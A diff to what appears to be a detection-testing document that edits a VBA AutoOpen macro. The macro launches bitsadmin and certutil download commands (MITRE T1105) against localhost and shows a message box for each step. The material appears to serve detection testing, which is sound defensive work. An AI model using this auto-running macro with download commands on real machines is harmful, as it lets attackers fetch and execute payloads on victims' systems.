@@ -429,7 +429,6 @@ Rule {
 ```
 Test VBA Code
 ```
-	
 
 Public Sub AutoOpen()
     Dim objWshell1 As Object
@@ -451,14 +450,24 @@ Public Sub AutoOpen()
     objWshell1.Exec (psString)
 
 
-  '3 - VBA Launching regedit for execution
-    psString = "certutil.exe -urlcache -split -f http:/127.0.0.1/file file.exe"
+  '3 - VBA Launching svchost.exe for execution
+    psString = "bitsadmin /create 1 bitsadmin /addfile 1 http://127.0.0.1/test c:\windows\temp\test /complete 1"
         
-    MsgBox ("3 - certutil " + Chr(13) & Chr(10) + "MITRE ATT&CK: T1105 " + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10) + "NOTE: you will see an error!")
+    MsgBox ("3 - bitsadmin.exe " + Chr(13) & Chr(10) + "MITRE ATT&CK: T1105 " + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10) + "NOTE: you will see an error!")
     objWshell1.Exec (psString)
     
     
 
+  '4 - VBA Launching certutil.exe for execution
+    psString = "certutil.exe -urlcache -split -f http:/127.0.0.1/file file.exe"
+        
+    MsgBox ("4 - certutil " + Chr(13) & Chr(10) + "MITRE ATT&CK: T1105 " + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10) + "NOTE: you will see an error!")
+    objWshell1.Exec (psString)
+    
+    
+
+
     
 End Sub
+
 ```
